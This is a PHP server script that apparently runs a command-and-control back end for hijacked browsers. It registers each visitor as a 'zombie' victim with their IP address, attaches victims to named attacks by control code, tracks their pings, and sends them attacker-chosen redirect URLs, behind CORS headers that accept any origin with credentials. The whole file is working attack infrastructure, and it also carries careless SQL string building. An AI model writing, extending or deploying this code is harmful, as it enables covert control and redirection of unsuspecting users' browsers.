<?php
	// Allow from any origin
	if (isset($_SERVER['HTTP_ORIGIN'])) {
		header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
		header('Access-Control-Allow-Credentials: true');
		header('Access-Control-Max-Age: 86400');    // cache for 1 day
	}

	// Access-Control headers are received during OPTIONS requests
	if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
		if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
				header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         
		if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
				header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
		exit(0);
	}

	session_start();
	include('prereq.php');
	$db = new MyDB();

	function zombieVictim($db){
		session_destroy();
		session_start();
		$db->query("INSERT INTO victims (ip, attack_id, status) VALUES ('".$_SERVER["REMOTE_ADDR"]."', NULL, ".MyDB::STATUS_ZOMBIE.")");
		$_SESSION["id"] = $db->lastInsertRowID();
		print "0;"; // we just created this, no way we want it to move yet (we didn't click yet)
	}

	// set the user to active, and update the latest ping
	function setActiveAndPing($db){
		$db->query("UPDATE victims SET ".
							 "status = ".MyDB::STATUS_ACTIVE.", ".
							 "last_ping = ".time()." ".
							 "WHERE id = ".(int)$_SESSION['id']);
		if ( isset($_GET['c']) && $_GET['c'] != ""){
			$code = ereg_replace('/[^a-z0-9]/','',$_GET['c']); // suckurity 101
			$attack_id = $db->querySingle("SELECT id FROM attacks WHERE control_code = '".$code."'", false);
			AddVictimToAttack($db, intval($attack_id));
		}
	}

	// check the action, return new URL or NULL for nothing
	function checkAction($db){
		$res = "0;";
		$new_url = $db->querySingle("SELECT new_url FROM victims WHERE action = 1 AND id = ".(int)$_SESSION['id'], false);
		if($new_url){ $res = "1;".$new_url; }
		print $res;
		// we give the result already (for the redirect?), but we set it back to 0
		$db->query("UPDATE victims SET action = 0 WHERE id = ".(int)$_SESSION['id']);
	}

	function AddVictimToAttack($db, $attack_id){
		$db->query("UPDATE victims SET attack_id = ".(int)$attack_id." WHERE id = ".$_SESSION['id']);
	}

	if(	isset($_SESSION["id"]) && $_SESSION["id"] > 0 && $db->querySingle("SELECT id FROM victims WHERE id = ".(int)$_SESSION['id'], false)){
		// we are an active session
			setActiveAndPing($db);
			print checkAction($db);
	} else {
		// there's no id found for this victim
		zombieVictim($db);
	}
?>
